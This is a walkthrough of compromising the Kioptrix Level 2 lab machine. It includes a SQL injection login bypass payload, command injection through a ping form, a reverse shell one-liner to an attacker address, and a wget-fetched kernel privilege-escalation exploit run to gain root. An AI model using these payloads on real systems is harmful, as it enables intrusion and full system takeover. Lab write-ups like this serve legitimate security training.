```
192.168.56.111
```

## Nmap Results
<pre style="font-size: 12px";>
$ sudo nmap -p- -sV -sC 192.168.56.111 -oA kioptrix_level2
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
<font color=red>22/tcp </font>  open  ssh      <font color=red>OpenSSH 3.9p1</font> (protocol 1.99)
|_sshv1: Server supports <font color=red>SSHv1</font>
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
<font color=red>80/tcp</font>   open  http     <font color=red>Apache httpd 2.0.52</font> ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
<font color=red>111/tcp</font>  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            625/udp   status
|_  100024  1            628/tcp   status
<font color=red>443/tcp</font>  open  ssl/http <font color=red>Apache httpd 2.0.52</font> ((CentOS))
|_ssl-date: 2022-07-21T15:47:14+00:00; +4h00m00s from scanner time.
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| sslv2:
|   <font color=red>SSLv2</font> supported
|   ciphers:
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_http-server-header: Apache/2.0.52 (CentOS)
<font color=red>628/tcp</font>  open  status   1 (RPC #100024)
<font color=red>631/tcp</font>  open  ipp      <font color=red>CUPS 1.1</font>
| http-methods:
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.1
<font color=red>3306/tcp</font> open  mysql    <font color=red>MySQL (unauthorized)</font>
</pre>

Visiting the website we're presented with a login page.

![](/Assets/images/kioptrix2/kioptrix2-img1.png)

Since MySQL is running I try SQL injection. I use burpsuite with `payloadsallthethings/SQL Injection/Intruder/Auth_Bypass.txt`  as the payload and it returns `' or 'x'='x`.

So  the SQL query would probably look something like this,
<pre style="font-size: 12px";>SELECT * FROM users WHERE uname='admin' AND pass='<font color=red>' or 'x'='x</font>';</pre>

Using the above payload as password, we're now logged in as admin. The input below seems to accept an ip address to ping to. 

![](/Assets/images/kioptrix2/kioptrix2-img2.png)
We can try to use semi-colon to chain the command and see if we can get RCE.

![](/Assets/images/kioptrix2/kioptrix2-img3.png)
![](/Assets/images/kioptrix2/kioptrix2-img4.png)
Great! We have RCE. Let's pop up a reverse shell with `; sh -i >& /dev/tcp/192.168.56.157/1234 0>&1` as input.
<pre style="font-size: 12px";>listening on [any] 1234 ...
connect to [192.168.56.157] from (UNKNOWN) [192.168.56.111] 32772
sh: no job control in this shell
sh-3.00$</pre>

## Post Exploitation
<pre style="font-size: 12px";>
sh-3.00$ uname -a
Linux kioptrix.level2<font color=red> 2.6.9-55.EL</font> #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
sh-3.00$ lsb_release -a
LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID: CentOS
Description:    <font color=red>CentOS release 4.5 (Final)</font>
Release:        4.5
Codename:       Final
sh-3.00$ file /bin/bash
/bin/bash: ELF <font color=red>32-bit </font>LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), stripped
</pre>
Now that we know the OS kernel and distro we can try to find a matching exploit.

![](/Assets/images/kioptrix2/kioptrix2-img5.png)
I'm gonna try the top 3 suggested since the 4th doesn't really match with the target's system and the 5th one is for 64-bit. 

<pre style="font-size: 12px";>
sh-3.00$ wget http://192.168.56.157:9001/9545.c
sh-3.00$ gcc 9545.c -o priv
9545.c:376:28: warning: no newline at end of file
sh-3.00$ ./priv
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
</pre>

The first one worked! I've tried the 2nd one and It gave the target system kernel panic (yeesh). The 3rd one doesn't work. 